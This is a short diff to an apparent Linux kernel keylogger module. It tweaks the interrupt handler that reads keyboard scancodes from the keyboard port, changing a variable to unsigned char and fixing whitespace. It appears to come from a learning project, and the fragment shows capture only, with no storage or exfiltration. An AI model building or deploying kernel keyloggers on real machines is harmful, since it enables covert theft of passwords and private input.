@@ -70,8 +70,8 @@ static struct miscdevice misc_dev = {
 
 static irqreturn_t keylogger_handle(int irq_n, void *data)
 {
-	t_keylogger_data 	*logs = (t_keylogger_data *)data;
-	char 				scancode;
+	t_keylogger_data	*logs = (t_keylogger_data *)data;
+	unsigned char		scancode;
 	(void)logs;
 
 	scancode = inb(KB_PORT);
